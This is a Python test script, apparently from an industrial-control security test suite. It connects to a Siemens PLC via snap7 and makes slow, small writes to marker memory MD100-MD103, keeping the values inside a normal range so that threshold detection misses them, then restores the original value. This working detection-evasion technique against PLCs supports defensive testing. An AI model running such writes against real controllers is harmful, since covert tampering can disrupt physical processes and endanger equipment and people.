#!/usr/bin/env python3
"""
tests/test_stealthy_write.py
STEALTHY_LOW_RATE_MARKER_WRITE
Ghi nhe tan suat thap vao vung Marker thu nghiem MD100-MD103.
Gia tri trong nguong hop le (1000-1100) -> kho detect bang threshold.
Yeu cau: xac nhan MD100-MD103 KHONG duoc PLC logic su dung.

Chay: python tests/test_stealthy_write.py
"""

import sys
import os
import time
import random

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tests.common import *

TEST_MARKER = 100
WRITE_COUNT = 5
INTERVAL = 10
NORMAL_MIN = 900
NORMAL_MAX = 1100


def read_marker_dint(client, offset):
    try:
        from snap7.type import Areas
    except ImportError:
        from snap7.types import Areas
    from snap7.util import get_dint
    return get_dint(client.read_area(Areas.MK, 0, offset, 4), 0)


def write_marker_dint(client, offset, value):
    try:
        from snap7.type import Areas
    except ImportError:
        from snap7.types import Areas
    from snap7.util import set_dint
    buf = bytearray(4)
    set_dint(buf, 0, value)
    client.write_area(Areas.MK, 0, offset, buf)


def clamp_to_normal(value):
    if value < NORMAL_MIN:
        return NORMAL_MIN + abs(value) % (NORMAL_MAX - NORMAL_MIN)
    if value > NORMAL_MAX:
        return NORMAL_MAX - abs(value) % (NORMAL_MAX - NORMAL_MIN)
    return value


def main():
    print(f"\n{B}[TEST] STEALTHY_LOW_RATE_MARKER_WRITE{X}")
    info(f"PLC: {PLC_IP}  Target: MD{TEST_MARKER} (test marker)")
    info(f"Range: {NORMAL_MIN}-{NORMAL_MAX}  Writes: {WRITE_COUNT}  Interval: {INTERVAL}s")

    changes = []
    observable = []
    notes = []
    error = None
    writes_done = 0
    t0 = time.time()

    try:
        import snap7
        c = snap7.client.Client()
        c.connect(PLC_IP, RACK, SLOT)
        ok("S7 connected")

        original = read_marker_dint(c, TEST_MARKER)
        info(f"MD{TEST_MARKER} original: {original}")

        # Dua ve vung normal neu nam ngoai
        if original < NORMAL_MIN or original > NORMAL_MAX:
            warn(f"MD{TEST_MARKER}={original} ngoai vung normal -> set ve 1000")
            baseline = 1000
            write_marker_dint(c, TEST_MARKER, baseline)
            info(f"MD{TEST_MARKER} baseline: {baseline}")
        else:
            baseline = original

        before = plc_snapshot(c)

        for i in range(WRITE_COUNT):
            current = read_marker_dint(c, TEST_MARKER)
            # Ghi gia tri trong nguong — khong bao gio vuot normal_min/max
            delta = random.choice([-12, -8, 8, 12])
            new_val = clamp_to_normal(current + delta)
            write_marker_dint(c, TEST_MARKER, new_val)
            writes_done += 1
            ok(f"  #{i+1}: MD{TEST_MARKER} {current} -> {new_val}")
            observable.append(f"Low-rate write MD{TEST_MARKER}: {current}->{new_val}")
            time.sleep(INTERVAL)

        # Restore
        write_marker_dint(c, TEST_MARKER, baseline)
        restored = read_marker_dint(c, TEST_MARKER)
        if restored == baseline:
            ok(f"Restored MD{TEST_MARKER} = {baseline}")
        else:
            warn(f"Restore lech: {restored} != {baseline}")

        after = plc_snapshot(c)
        changes = plc_diff(before, after)

        notes.append(f"Actual writes: {writes_done}/{WRITE_COUNT}")
        notes.append(f"Target: MD{TEST_MARKER}-MD{TEST_MARKER+3}, CONFIRM unused in TIA Portal")
        notes.append(f"Values within normal range {NORMAL_MIN}-{NORMAL_MAX}")
        notes.append("Threshold/signature don gian co the bo qua neu khong ket hop timing+context")

        c.disconnect()

    except Exception as e:
        error = str(e)
        fail(str(e))

    success = writes_done > 0
    if not success:
        notes.append("NO_ATTACK_EXECUTED")

    print_result("STEALTHY_LOW_RATE_MARKER_WRITE", success, changes, observable, notes, time.time() - t0, error)


if __name__ == "__main__":
    main()
